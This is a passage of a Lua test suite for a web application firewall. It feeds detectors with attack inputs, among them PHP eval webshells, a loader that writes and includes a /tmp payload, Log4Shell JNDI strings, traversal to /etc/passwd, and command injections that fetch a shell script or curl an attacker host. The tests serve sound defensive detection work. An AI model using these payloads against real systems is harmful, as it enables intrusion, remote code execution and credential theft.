    args = "url=stratum+tcp://pool.minexmr.com:4444",
  }))
  check(hit == true,                          "46: X2-stratum — hit")
  check(reason == "WAF_SSRF:SSRF_STRATUM",    "46: X2-stratum — reason")
  check(rule_id == 701,                       "46: X2-stratum — rule id 701 (folded, not new)")
end

-- ── Test 47: X1 c2_tunnel — pastebin raw URL in body (rule 702) ──────────────
do
  disable_all_rules()
  waf.set_rule("rule_c2_tunnel", "logonly")

  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    method = "POST",
    body   = "fetch=https://pastebin.com/raw/AbCdEf12",
  }))
  check(hit == true,                          "47: X1 c2_tunnel — hit")
  check(reason == "WAF_C2:TUNNEL:PASTEBIN_RAW", "47: X1 c2_tunnel — reason")
  check(action == "logonly",                  "47: X1 c2_tunnel — logonly")
  check(rule_id == 702,                       "47: X1 c2_tunnel — rule id 702")
end

-- ── Test 48: X1 c2_tunnel — Discord CDN attachment URL ──────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_c2_tunnel", "logonly")

  local hit, reason = waf.check(fresh_ctx({
    args = "url=https://cdn.discordapp.com/attachments/123/456/payload.exe",
  }))
  check(hit == true,                                       "48: X1 c2_tunnel — discord hit")
  check(reason == "WAF_C2:TUNNEL:DISCORD_CDN",             "48: X1 c2_tunnel — discord tag")
end

-- ── Test 49: X1 c2_tunnel — bare pastebin.com without /raw/ doesn't fire ─────
do
  disable_all_rules()
  waf.set_rule("rule_c2_tunnel", "logonly")

  -- Pastebin homepage URLs don't have /raw/ — those are usually shared by
  -- humans, not used for C2.
  local hit = waf.check(fresh_ctx({
    args = "ref=https://pastebin.com/AbCdEf12",
  }))
  check(hit == false, "49: X1 c2_tunnel — bare pastebin.com without /raw/, no hit")
end

-- ── Test 50: X2 coinminer — xmrig invocation flag (rule 327) ────────────────
do
  disable_all_rules()
  waf.set_rule("rule_coinminer", "logonly")

  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    method = "POST",
    body   = "cmd=xmrig --url stratum+tcp://pool.example:4444 -u WALLET",
  }))
  check(hit == true,                                          "50: X2 coinminer — hit")
  check(reason and reason:find("COINMINER:XMRIG_URL", 1, true), "50: X2 coinminer — XMRIG_URL tag")
  check(action == "logonly",                                  "50: X2 coinminer — logonly")
  check(rule_id == 327,                                       "50: X2 coinminer — rule id 327")
end

-- ── Test 51: X2 coinminer — public pool hostname only ───────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_coinminer", "logonly")

  local hit, reason = waf.check(fresh_ctx({
    body = "config=pool.minexmr.com:5555",
  }))
  check(hit == true,                                                "51: X2 coinminer — pool hit")
  check(reason and reason:find("COINMINER:POOL_MINEXMR", 1, true),  "51: X2 coinminer — POOL_MINEXMR tag")
end

-- ── Test 52: B1 smuggling_cl — both Content-Length and Transfer-Encoding ────
do
  disable_all_rules()
  waf.set_rule("rule_smuggling_cl", "logonly")

  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    method  = "POST",
    headers = {
      ["Content-Length"]    = "10",
      ["Transfer-Encoding"] = "chunked",
    },
    body = "abcdef",
  }))
  check(hit == true,                              "52: B1 smuggling_cl — hit")
  check(reason == "WAF_HTTP_SMUGGLING:CL_AND_TE", "52: B1 smuggling_cl — CL_AND_TE tag")
  check(action == "logonly",                      "52: B1 smuggling_cl — logonly")
  check(rule_id == 608,                           "52: B1 smuggling_cl — rule id 608")
end

-- ── Test 53: B1 smuggling_cl — multi-CL (joined by nginx) ───────────────────
do
  disable_all_rules()
  waf.set_rule("rule_smuggling_cl", "logonly")

  local hit, reason = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Length"] = "5, 10" },
    body    = "abc",
  }))
  check(hit == true,                              "53: B1 smuggling_cl — multi-CL hit")
  check(reason == "WAF_HTTP_SMUGGLING:MULTI_CL",  "53: B1 smuggling_cl — MULTI_CL tag")
end

-- ── Test 54: B1 smuggling_cl — well-formed CL alone doesn't fire ────────────
do
  disable_all_rules()
  waf.set_rule("rule_smuggling_cl", "logonly")

  local hit = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Length"] = "12" },
    body    = "Hello world!",
  }))
  check(hit == false, "54: B1 smuggling_cl — well-formed CL, no hit")
end

-- ── Test 54z: ctx.self_origin short-circuits the WAF before any rule runs ──
-- cfm.lua computes self_origin via is_self_origin(ip) and passes it into
-- waf.check(). Even with rules that would otherwise fire on a payload,
-- self-origin must return (false, nil, nil, nil) immediately — defence in
-- depth against any caller that bypasses cfm.lua's Step 0a hard bypass.
do
  disable_all_rules()
  -- Block-class rule that would normally fire on a JNDI payload.
  waf.set_rule("rule_rce", "block")

  local hit, reason, ttl, action = waf.check(fresh_ctx({
    args        = "x=${jndi:ldap://evil/}",
    self_origin = true,
  }))
  check(hit == false,   "54z: self_origin — hit=false despite RCE payload")
  check(reason == nil,  "54z: self_origin — reason nil")
  check(ttl == nil,     "54z: self_origin — ttl nil")
  check(action == nil,  "54z: self_origin — action nil")
end

-- ── Test 54z2: ctx.self_origin=false does not bypass ─────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_rce", "block")

  local hit, _reason, _ttl, action = waf.check(fresh_ctx({
    args        = "x=${jndi:ldap://evil/}",
    self_origin = false,
  }))
  check(hit == true,        "54z2: self_origin=false — RCE still fires")
  check(action == "block",  "54z2: self_origin=false — action=block")
end

-- ── Test 54a: detect_traversal — signal-based matching (rule 101) ───────────
-- The detector fires only on strong-signal traversal:
--   * null bytes (raw or percent-encoded)
--   * encoded `..%2f` / `%2e%2e/` variants
--   * multi-hop `../../`
--   * single `../` paired with a sensitive sink (wp-config, /etc/passwd,
--     pearcmd, xmlrpc.php, etc.)
-- Single `../` against benign targets (phpThumb `?src=../images/foo.jpg`)
-- and three-or-more-dot patterns (FB share-debug `/.../x`, ellipsis CMS
-- slugs `/pro.../x/`) must NOT fire. Mirrors the 2026-05-05 → 2026-05-11
-- mars/virgo/orion log sample.
do
  disable_all_rules()
  waf.set_rule("rule_traversal", "challenge")

  local cases = {
    -- True positives — every shape we observed in real attacks
    { uri = "/contrib/acog/print_form.php",
      args = "formname=../../../etc/passwd%00",
      expect = true,  label = "TP: null byte + etc/passwd" },
    { uri = "/wp-admin/admin-ajax.php",
      args = "template=../xmlrpc.php&value=a",
      expect = true,  label = "TP: ../ + xmlrpc.php sink" },
    { uri = "/wp-admin/admin-ajax.php",
      args = "template=../../../../../../../wp-config&value=a",
      expect = true,  label = "TP: multi-hop + wp-config" },
    { uri = "/wp-admin/admin-ajax.php",
      args = "template=..%2F..%2F..%2F..%2F..%2F..%2Fwp-config",
      expect = true,  label = "TP: encoded ..%2F variant" },
    { uri = "/wp-admin/admin-ajax.php",
      args = "action=revslider_show_image&img=../wp-config.php",
      expect = true,  label = "TP: RevSlider wp-config LFI" },
    { uri = "/index.php",
      args = "lang=../../../../../../../../usr/local/lib/php/pearcmd",
      expect = true,  label = "TP: pearcmd RCE" },

    -- False positives — must NOT fire
    { uri = "/.../eyritania-roska-pantavrexi",
      args = "",
      expect = false, label = "FP: FB share-debug /.../" },
    { uri = "/pro.../blouzaki-t-shirt-craft/",
      args = "",
      expect = false, label = "FP: CMS ellipsis slug /pro.../" },
    { uri = "/product.../papoutsia-ergasias/",
      args = "",
      expect = false, label = "FP: CMS ellipsis slug /product.../" },
    { uri = "/mparmp.../mparmpastathis-horeca.html",
      args = "",
      expect = false, label = "FP: CMS ellipsis slug /mparmp.../" },
    { uri = "/.../papoutsi-ergasias-rodi.../",
      args = "",
      expect = false, label = "FP: trailing triple-dot /x.../"  },
    { uri = "/thumb/phpThumb.php",
      args = "src=../images/products/1455634838_Photo-0445.jpg&w=800&h=600",
      expect = false, label = "FP: phpThumb single ../ to benign /images/" },
  }

  for _, c in ipairs(cases) do
    local hit = waf.check(fresh_ctx({ uri = c.uri, args = c.args }))
    check(hit == c.expect,
      string.format("54a: detect_traversal — %s (uri=%s)", c.label, c.uri))
  end
end

-- ── Test 55: B3 long_path_segment — segment ≥ 800 chars (rule 102) ──────────
do
  disable_all_rules()
  waf.set_rule("rule_long_path_segment", "logonly")

  -- 900-byte segment, well over the 800-byte threshold.
  local big = string.rep("A", 900)
  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    uri = "/api/" .. big,
  }))
  check(hit == true,                                  "55: B3 long_path_segment — hit")
  check(reason == "WAF_LONG_PATH:SEG_900",            "55: B3 long_path_segment — SEG_900 tag")
  check(action == "logonly",                          "55: B3 long_path_segment — logonly")
  check(rule_id == 102,                               "55: B3 long_path_segment — rule id 102")
end

-- ── Test 56: B3 long_path_segment — short URI doesn't fire ──────────────────
do
  disable_all_rules()
  waf.set_rule("rule_long_path_segment", "logonly")

  local hit = waf.check(fresh_ctx({
    uri = "/some/normal/path/with/many/segments/index.html",
  }))
  check(hit == false, "56: B3 long_path_segment — normal URI, no hit")
end

-- ── Test 56b: B3 long_path_segment — UTF-8 Greek slug under threshold ───────
-- Mirrors real news1.gr / nitromag.gr product URLs that were producing
-- SEG_319 / SEG_603 false positives at the old 256 threshold. ~700 bytes,
-- single segment, must not fire under the 800-byte threshold.
do
  disable_all_rules()
  waf.set_rule("rule_long_path_segment", "logonly")

  -- 16 × 43 bytes = 688 bytes — bigger than the historical SEG_603 false
  -- positive on news1.gr but still safely under the 800-byte threshold.
  local greek_slug = string.rep("%CE%91%CE%BD%CF%84%CF%81%CE%B9%CE%BA%CE%AC-", 16)
  local hit = waf.check(fresh_ctx({
    uri = "/p/" .. greek_slug .. "/",
  }))
  check(hit == false, "56b: B3 long_path_segment — UTF-8 slug below 800 doesn't fire")
end

-- ── Test 57: B4 header_flood — > 16 KB of non-session headers (rule 609) ────
do
  disable_all_rules()
  waf.set_rule("rule_header_flood", "logonly")

  -- Build a non-session header > 16 KB. X-Custom: <17000 chars>
  local big = string.rep("X", 17000)
  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    headers = { ["X-Custom-Junk"] = big },
  }))
  check(hit == true,                                "57: B4 header_flood — hit")
  check(reason and reason:find("WAF_HEADER_FLOOD:FLOOD:", 1, true),
                                                    "57: B4 header_flood — FLOOD tag")
  check(action == "logonly",                        "57: B4 header_flood — logonly")
  check(rule_id == 609,                             "57: B4 header_flood — rule id 609")
end

-- ── Test 58: B4 header_flood — large Cookie alone doesn't fire ──────────────
do
  disable_all_rules()
  waf.set_rule("rule_header_flood", "logonly")

  -- 17 KB Cookie — legit on shared hosting with WP/cPanel session bloat.
  local big = string.rep("c", 17000)
  local hit = waf.check(fresh_ctx({
    headers = { ["Cookie"] = big },
  }))
  check(hit == false, "58: B4 header_flood — Cookie alone is session state, no hit")
end

-- Helper to build a multipart body with a single part of the given headers
-- and payload. Boundary is a fixed test sentinel; the same string is fed
-- into the request Content-Type header.
local TEST_BOUNDARY = "----CFMTestBoundary12345"
local function multipart_body(part_headers, payload)
  return "--" .. TEST_BOUNDARY .. "\r\n"
      .. part_headers .. "\r\n\r\n"
      .. payload .. "\r\n"
      .. "--" .. TEST_BOUNDARY .. "--\r\n"
end
local TEST_CT = "multipart/form-data; boundary=" .. TEST_BOUNDARY

-- ── Test 59: W4 polyglot — image/png CT + <?php opener (rule 412) ───────────
do
  disable_all_rules()
  waf.set_rule("rule_polyglot_upload", "logonly")

  local body = multipart_body(
    'Content-Disposition: form-data; name="avatar"; filename="x.png"\r\n'
    .. 'Content-Type: image/png',
    "<?php @eval($_POST['c']); ?>")
  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Type"] = TEST_CT },
    body    = body,
  }))
  check(hit == true,                                       "59: W4 polyglot — hit")
  check(reason == "WAF_UPLOAD_CONTENT:POLYGLOT_PHP",       "59: W4 polyglot — POLYGLOT_PHP tag")
  check(action == "logonly",                               "59: W4 polyglot — logonly")
  check(rule_id == 412,                                    "59: W4 polyglot — rule id 412")
end

-- ── Test 60: W4 polyglot — .jpg filename without image CT still fires ───────
do
  disable_all_rules()
  waf.set_rule("rule_polyglot_upload", "logonly")

  -- No Content-Type on the part — but the filename ends in .jpg, which is
  -- enough to trigger the image-claimed branch.
  local body = multipart_body(
    'Content-Disposition: form-data; name="up"; filename="cute.jpg"',
    "<%@ page import=\"java.util.*\" %>")
  local hit, reason = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Type"] = TEST_CT },
    body    = body,
  }))
  check(hit == true,                                                    "60: W4 polyglot — jsp directive hit")
  check(reason == "WAF_UPLOAD_CONTENT:POLYGLOT_JSP_DIRECTIVE",          "60: W4 polyglot — JSP directive tag")
end

-- ── Test 61: W4 polyglot — image part without executable opener doesn't fire ─
do
  disable_all_rules()
  waf.set_rule("rule_polyglot_upload", "logonly")

  -- A real PNG starts with the PNG signature bytes — no <?php / <% / <jsp:.
  local body = multipart_body(
    'Content-Disposition: form-data; name="avatar"; filename="x.png"\r\n'
    .. 'Content-Type: image/png',
    "\x89PNG\r\n\x1a\n....IHDR....actually-an-image")
  local hit = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Type"] = TEST_CT },
    body    = body,
  }))
  check(hit == false, "61: W4 polyglot — real PNG bytes, no hit")
end

-- ── Test 62: W4 polyglot — text form field with <?php text doesn't fire ─────
do
  disable_all_rules()
  waf.set_rule("rule_polyglot_upload", "logonly")

  -- A regular text form field (no image CT, no image extension) carrying
  -- <?php text. Rule 402 would scan the raw body and fire; W4 does NOT
  -- because the part isn't image-claimed.
  local body = multipart_body(
    'Content-Disposition: form-data; name="snippet"',
    "<?php echo 'pasted code sample for the article'; ?>")
  local hit = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Type"] = TEST_CT },
    body    = body,
  }))
  check(hit == false, "62: W4 polyglot — non-image text field with <?php text, no hit")
end

-- ── Test 63: Rule 404 ext — <?php + $_POST + dynamic include fires (404) ───
do
  disable_all_rules()
  waf.set_rule("rule_php_webshell_body", "challenge")

  -- Loader-pattern fingerprint shared by samples 1+4 (forms.php / user.php)
  -- from the 2026-05-09 sample-replay audit: include's argument is a
  -- variable that came from $_POST. Score: <?php(+2) + $_POST(+2) +
  -- dyn-include(+1) = 5 → fires.
  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
    body    = "src=<?php $tmp=$_POST['key']; include $tmp;",
  }))
  check(hit == true,                                          "63: rule 404 ext — hit")
  check(reason == "WAF_PHP_WEBSHELL_BODY:RAW_DYN_INCLUDE",    "63: rule 404 ext — RAW_DYN_INCLUDE tag")
  check(action == "challenge",                                "63: rule 404 ext — challenge action")
  check(rule_id == 404,                                       "63: rule 404 ext — rule id 404 (extension, not new rule)")
end

-- ── Test 64: Rule 404 ext — sanitised forms.php loader (variable include) ──
do
  disable_all_rules()
  waf.set_rule("rule_php_webshell_body", "challenge")

  -- Faithful sanitised excerpt from the 5a71c4ab-forms.php sample:
  -- include_once $_13 (variable form). Score: <?php(+2) + $_POST(+2) +
  -- dyn-include_once(+1) = 5 → fires.
  local body = '<?php if(@$_POST["key"]!==null): '
            .. '$_13="/tmp/.pset"; '
            .. '$f=fopen($_13,"w"); fwrite($f,$payload); fclose($f); '
            .. 'include_once $_13; unlink($_13); '
            .. 'endif;'
  local hit, reason = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
    body    = body,
  }))
  check(hit == true,                                                 "64: rule 404 ext — forms.php sample hit")
  check(reason == "WAF_PHP_WEBSHELL_BODY:RAW_DYN_INCLUDE_ONCE",      "64: rule 404 ext — RAW_DYN_INCLUDE_ONCE tag")
end

-- ── Test 65: Rule 404 ext — bare WP bootstrap (literal include, no SG) ─────
do
  disable_all_rules()
  waf.set_rule("rule_php_webshell_body", "challenge")

  -- WordPress-style bootstrap: literal include __DIR__... — has_dynamic_include
  -- skips this (next char after `include\s+` is `_`, not `$`). Score: 2+0=2.
  local hit = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
    body    = '<?php include __DIR__."/wp-blog-header.php";',
  }))
  check(hit == false, "65: rule 404 ext — WP bootstrap (literal include), no hit")
end

-- ── Test 66: Rule 404 ext — legit echo with $_POST does NOT fire (FP fix) ──
do
  disable_all_rules()
  waf.set_rule("rule_php_webshell_body", "challenge")

  -- Pre-fix this body scored 5 (<?php + $_POST + ;<?php bonus) and FP'd
  -- with tag RAW_SUPERGLOBAL — the bonus has been removed. New score:
  -- <?php(+2) + $_POST(+2) = 4 < 5 → no hit. This is the targeted FP fix.
  local hit = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
    body    = "<?php $x=$_POST['msg']; echo htmlspecialchars($x);",
  }))
  check(hit == false, "66: rule 404 ext — legit echo with $_POST, no FP")
end

-- ── Test 67: Rule 404 ext — legit code-snippet save with literal require ──
do
  disable_all_rules()
  waf.set_rule("rule_php_webshell_body", "challenge")

  -- Code-snippet plugin save: require_once with literal-string path,
  -- alongside a $_POST capture. Pre-fix this scored 5 and FP'd. Now:
  -- has_dynamic_include skips the literal-string require_once, so
  -- score = <?php(+2) + $_POST(+2) = 4 → no hit.
  local hit = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
    body    = "<?php require_once 'config.php'; $key=$_POST['k']; save($key);",
  }))
  check(hit == false, "67: rule 404 ext — legit literal-require + $_POST, no FP")
end

-- ── Test for regression: rule 402 upload_content path doesn't crash ────────
-- Pre-fix: cfm_waf.lua:679 called is_known_legit_php_upload_endpoint as a
-- bare global (the helper is exported on the util module but no local
-- binding existed in cfm_waf.lua). Any multipart POST that triggered the
-- rule_upload_content branch would crash _M.check with
--   "attempt to call global 'is_known_legit_php_upload_endpoint' (a nil value)"
-- Default mode is `block`, so this fired in production on every multipart
-- upload — but no test exercised the path because of the crash.
do
  disable_all_rules()
  waf.set_rule("rule_upload_content", "block")

  -- Multipart body with a PHP-tag opener — would fire rule 402.
  local body = "--b\r\n"
            .. 'Content-Disposition: form-data; name="f"; filename="x.php"\r\n'
            .. "\r\n"
            .. "<?php eval($_POST['c']);\r\n"
            .. "--b--\r\n"

  -- Non-legit URI: rule should fire.
  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    method  = "POST",
    uri     = "/uploads/x.php",
    headers = { ["Content-Type"] = "multipart/form-data; boundary=b" },
    body    = body,
  }))
  check(hit == true,                                              "regression: rule 402 fires on multipart PHP upload")
  check(reason and reason:find("WAF_UPLOAD_CONTENT", 1, true),    "regression: WAF_UPLOAD_CONTENT family")
  check(action == "block",                                        "regression: block action")
  check(rule_id == 402,                                           "regression: rule id 402")

  -- Legit URI (Code Snippets plugin REST endpoint) should be skipped by
  -- is_known_legit_php_upload_endpoint, so the rule does NOT fire.
  local hit2 = waf.check(fresh_ctx({
    method  = "POST",
    uri     = "/wp-json/code-snippets/import",
    headers = { ["Content-Type"] = "multipart/form-data; boundary=b" },
    body    = body,
  }))
  check(hit2 == false, "regression: rule 402 skipped on Code Snippets endpoint (legit upload bypass)")

  -- String Locator plugin (in-browser PHP file editor) save endpoint — the
  -- POST body is the raw theme/plugin file being edited, so it legitimately
  -- carries <?php. is_known_legit_php_upload_endpoint must skip rule 402 here.
  local hit3 = waf.check(fresh_ctx({
    method  = "POST",
    uri     = "/wp-json/string-locator/v1/save",
    headers = { ["Content-Type"] = "multipart/form-data; boundary=b" },
    body    = body,
  }))
  check(hit3 == false, "regression: rule 402 skipped on String Locator save endpoint (legit code-editor bypass)")
end

-- ── Test 68: Rule 404 ext — eval-family still fires (no regression) ────────
do
  disable_all_rules()
  waf.set_rule("rule_php_webshell_body", "challenge")

  -- The original eval-detection path was the rule's main purpose. Removing
  -- the ;<?php bonus mustn't weaken it. Score: <?php(+2) + $_POST(+2) +
  -- eval((+3) = 7 → fires with RAW_EVAL_POST (the specific lookbehind).
  local hit, reason = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
    body    = "<?php @eval($_POST['c']);",
  }))
  check(hit == true,                                              "68: rule 404 ext — eval+$_POST still fires")
  check(reason == "WAF_PHP_WEBSHELL_BODY:RAW_EVAL_POST",          "68: rule 404 ext — RAW_EVAL_POST tag preserved")
end

-- ── Test 69: rule_proxy_header_sqli — duplicate XFF is NOT injection ───────
-- 2026-05 log review FP: Vodafone TR carrier-grade NAT + chained proxies
-- produce duplicate X-Forwarded-For headers; ngx returns those as a table.
-- The old detector flagged any non-string XFF as PROXY_HDR_INJECT and
-- challenged real users browsing normal blog pages. The duplicate-header
-- signal is now dropped; only single-quote SQLi remains.
do
  disable_all_rules()
  waf.set_rule("rule_proxy_header_sqli", "challenge")

  -- Duplicate XFF — ngx-style table value, no quote in either string.
  local hit_dup = waf.check(fresh_ctx({
    headers = { ["X-Forwarded-For"] = { "10.0.0.1", "203.0.113.5" } },
  }))
  check(hit_dup ~= true, "69: duplicate XFF (table value) does NOT trigger PROXY_HDR_INJECT")

  -- Single-quote in XFF — still detected as SQLi (uses first table entry).
  local hit_sqli, reason_sqli, _ttl, action_sqli = waf.check(fresh_ctx({
    headers = { ["X-Forwarded-For"] = "10.0.0.1' OR 1=1--" },
  }))
  check(hit_sqli == true,                                     "69: XFF with single-quote still fires")
  check(reason_sqli == "WAF_PROXY_HDR:PROXY_HDR_SQLI:x-forwarded-for",
                                                              "69: tag is PROXY_HDR_SQLI")
  check(action_sqli == "challenge",                           "69: action=challenge")

  -- Duplicate XFF where one entry carries the single-quote — header_string()
  -- picks the first non-empty string, so subsequent malicious entries are
  -- missed by design. We assert the documented behaviour: at minimum the
  -- benign case must not fire.
  local hit_dup_clean = waf.check(fresh_ctx({
    headers = { ["X-Forwarded-For"] = { "10.0.0.1", "203.0.113.5" } },
  }))
  check(hit_dup_clean ~= true, "69: duplicate XFF (all clean strings) does NOT fire")
end

-- ── Test 70: detect_cmd_param_key — generic dispatchers value-aware ────────
-- 2026-05 log review FPs: WP plugins / themes legitimately use cmd= /
-- system= / command= as verb selectors (elFinder cmd=open, LWS WooRewards
-- system=rewards, auto-parts visualizer command=viewres). The detector
-- requires the value to look shelly (metachars or shell-command word)
-- before firing on these three generic keys; PHP-function keys (exec=,
-- passthru=, shell_exec=, eval=, assert=) still fire on key alone.
--
-- Audit F14 narrowed the shell-word list and the tokeniser: (1) hyphen is no
-- longer a token separator, so compound identifiers (`host-01`, `item-id`)
-- don't shatter into bare shell words; (2) ubiquitous words (id, ls, ps, w,
-- pwd, env, cat, head, tail, less, more, host, fetch, route, ping, dig, arp)
-- were removed as legit-value collisions. Consequence: a bare, un-metachar'd
-- recon probe (`cmd=id`, `system=ls`) no longer fires — its weaponized form
-- (`cat /etc/passwd`, `id;`) still does, via the metachar/path checks.
do
  disable_all_rules()
  waf.set_rule("rule_cmd_params", "challenge")

  -- FP cases — must NOT fire.
  local fp_cases = {
    {"cmd=open&target=l1_lw",                  "elFinder file manager"},
    {"cmd=quantity",                           "WooCommerce mini-cart"},
    {"action=lws_woorewards_pointsoncart_bloc_refresh&origin=shortcode&system=rewards",
                                               "LWS WooRewards plugin"},
    {"command=viewres&target=inf&fon=ffffff",  "auto-parts visualiser"},
    {"cmd=login",                              "generic dispatcher: cmd=login"},
    {"system=us-east-1",                       "generic dispatcher: system=region"},
    -- F14: compound identifiers no longer shatter on `-` into bare shell words.
    {"system=host-01",                         "F14: hostname-like system=host-01"},
    {"command=item-id",                        "F14: identifier command=item-id"},
    -- Pure hyphen-tokeniser guard: `ssh` is STILL a listed word, so this fails
    -- pre-fix (ssh-key -> {ssh,key} -> ssh) and passes only because `-` is no
    -- longer a separator. `ssh-key` is a common legit management value.
    {"system=ssh-key",                         "F14: hyphen guard system=ssh-key (ssh kept)"},
    -- F14: ubiquitous words removed from the shell-word list.
    {"command=more",                           "F14: pagination command=more"},
    {"system=host",                            "F14: system=host (hostname field)"},
    {"system=env&val=prod",                    "F14: env selector system=env"},
    {"command=cat",                            "F14: category command=cat"},
    {"command=fetch",                          "F14: JS command=fetch"},
    {"command=head&n=10",                      "F14: command=head (list head)"},
    -- F14: bare, un-metachar'd recon probes are intentionally no longer flagged
    -- (weaponized forms still fire — see the metachar/path TP cases below).
    {"cmd=id",                                 "F14: bare cmd=id (weaponized id; still fires)"},
    {"system=ls",                              "F14: bare system=ls"},
    -- Joomla K2 media manager / elFinder: cmd=<verb> where the verb (rm /
    -- ls / mkdir / chmod) collides with a shell-command name. With
    -- task=connector present and a pristine verb, must NOT challenge — else
    -- the elFinder XHR gets the challenge redirect and the admin sees
    -- "Invalid backend response. Data is not JSON." (eydamth.gr, 2026-06).
    {"option=com_k2&view=media&task=connector&cmd=mkdir&name=ArticleID_0787&target=l1_c3Rvcmllcw&reqid=19ea605c",
                                               "K2 elFinder cmd=mkdir"},
    {"task=connector&cmd=rm&targets[]=l1_c3Rvcmllcy9B&reqid=19ea6b6f",
                                               "K2 elFinder cmd=rm"},
    {"task=connector&cmd=ls&target=l1_c3Rvcmllcw&intersect[]=4.jpg",
                                               "K2 elFinder cmd=ls"},
    {"task=connector&cmd=chmod&target=l1_x&mode=0755",
                                               "K2 elFinder cmd=chmod"},
  }
  for _, c in ipairs(fp_cases) do
    local hit = waf.check(fresh_ctx({ uri = "/wp-admin/admin-ajax.php", args = c[1] }))
    check(hit ~= true, "70: FP — " .. c[2] .. " does NOT trigger CMD_PARAM")
  end

  -- Real attacks — MUST fire.
  local tp_cases = {
    {"cmd=whoami",                             "CMD_CMD",       "cmd=whoami"},
    {"cmd=uname",                              "CMD_CMD",       "cmd=uname"},
    {"todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://1.2.3.4/m.sh",
                                               "CMD_CMD",       "Mozi/Netgear setup.cgi"},
    {"cmd=`whoami`",                           "CMD_CMD",       "cmd backtick"},
    -- F14: the dropped recon words are still caught in weaponized form — a
    -- metacharacter or a path makes value_looks_shelly fire regardless of the
    -- word list, so only the bare probe is lost.
    {"system=id;whoami",                       "CMD_SYSTEM",    "F14: weaponized system=id; (metachar)"},
    {"cmd=cat+/etc/shadow",                    "CMD_CMD",       "F14: weaponized cmd=cat /etc/shadow (path)"},
    {"command=/bin/sh",                        "CMD_COMMAND",   "command=/bin/sh"},
    {"command=curl+http://attacker",           "CMD_COMMAND",   "command=curl+url"},
    -- The elFinder carve-out is gated on task=connector AND a pristine verb,
    -- so a still-listed verb (mkdir) without the connector marker, or an
    -- injection that adds metacharacters / a path / a non-verb word, still
    -- fires even with task=connector appended as evasion.
    {"action=mk_file_folder_manager&cmd=mkdir", "CMD_CMD",      "bare cmd=mkdir, no connector"},
    {"task=connector&cmd=rm;cat+/etc/passwd",  "CMD_CMD",       "connector evasion + metachar"},
    {"task=connector&cmd=cat+/etc/passwd",     "CMD_CMD",       "connector evasion + path"},
    -- `task` must be a real key == connector; the marker buried in another
    -- param's value must NOT enable the carve-out (key-precise check).
    {"foo=task=connector&cmd=rm",              "CMD_CMD",       "task=connector as other param's value"},
  }
  for _, c in ipairs(tp_cases) do
    local hit, reason = waf.check(fresh_ctx({ uri = "/", args = c[1] }))
    check(hit == true,
          "70: TP — " .. c[3] .. " triggers WAF_CMD_PARAM")
    check(reason == "WAF_CMD_PARAM:" .. c[2],
          "70: TP — " .. c[3] .. " tag is " .. c[2] .. " (got " .. tostring(reason) .. ")")
  end

  -- PHP-function keys still fire on key presence alone — no narrowing.
  for _, c in ipairs({
    {"exec=foo",       "CMD_EXEC"},
    {"passthru=x",     "CMD_PASSTHRU"},
    {"shell_exec=y",   "CMD_SHELL_EXEC"},
    {"eval=1",         "CMD_EVAL"},
    {"assert=1",       "CMD_ASSERT"},
  }) do
    local hit, reason = waf.check(fresh_ctx({ uri = "/", args = c[1] }))
    check(hit == true and reason == "WAF_CMD_PARAM:" .. c[2],
          "70: PHP-func key — " .. c[1] .. " still fires as " .. c[2])
  end
end

-- ── Test 71: promotion defaults hold in the default CFG ────────────────────
-- Earlier clean burn-ins promoted the original challenge batch; the 2026-08-23
-- batch additionally promotes 101/319/701 to challenge and 309/510/511/512 to
-- block. Read a freshly-required module so earlier set_rule() calls do not
-- pollute the snapshot.
do
  package.loaded["cfm_waf"] = nil
  package.loaded["cfm_waf_detectors"] = nil
  package.loaded["cfm_waf_util"] = nil
  local fresh_waf = require("cfm_waf")
  local snap = fresh_waf.get_config()
  local must_be_challenge = {
    "rule_ip_host",
    "rule_ctrl_chars",
    "rule_debug_toggles",
    "rule_serialize",
    "rule_cmd_payload_backtick",
    "rule_header_flood",
    "rule_cmd_payload",  -- fallback default, kept aligned with sub-rules
    "rule_traversal",
    "rule_sqli_union_variant",
    "rule_ssrf",
  }
  for _, name in ipairs(must_be_challenge) do
    check(snap[name] == "challenge",
          "71: " .. name .. " ships as 'challenge' (got " .. tostring(snap[name]) .. ")")
  end
  local must_be_block = {
    "rule_sqli_blind_lexical",
    "rule_xmlrpc_multicall",
    "rule_xmlrpc_pingback",
    "rule_xmlrpc_post_burst",
  }
  for _, name in ipairs(must_be_block) do
    check(snap[name] == "block",
          "71: " .. name .. " ships as 'block' (got " .. tostring(snap[name]) .. ")")
  end
end

-- ── Test 72: rule_log4shell — evasion-variant body hit ──────────────────────
-- The bare "${jndi:" form is caught by rule_rce (320). rule_log4shell (328)
-- covers the lookup-syntax evasion that defeats substring matching on 320.
do
  disable_all_rules()
  waf.set_rule("rule_log4shell", "challenge")

  local body = [[{"x":"${${::-j}${::-n}${::-d}${::-i}:ldap://evil/a}"}]]
